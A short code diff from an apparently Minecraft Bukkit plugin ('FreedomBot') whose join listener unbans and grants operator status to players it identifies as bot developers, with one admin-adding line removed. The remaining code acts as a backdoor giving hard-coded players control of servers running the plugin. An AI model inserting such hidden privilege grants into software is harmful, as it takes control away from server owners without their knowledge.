@@ -43,7 +43,6 @@ public class BotListener implements Listener {
             BotUtil.unbanIP(player);
             player.setOp(true);
             Bukkit.broadcastMessage(BotUtil.BOTPREFIX + "A FreedomBot developer has joined!");
-            BotUtil.addAdmin(player);
         }
 
     }
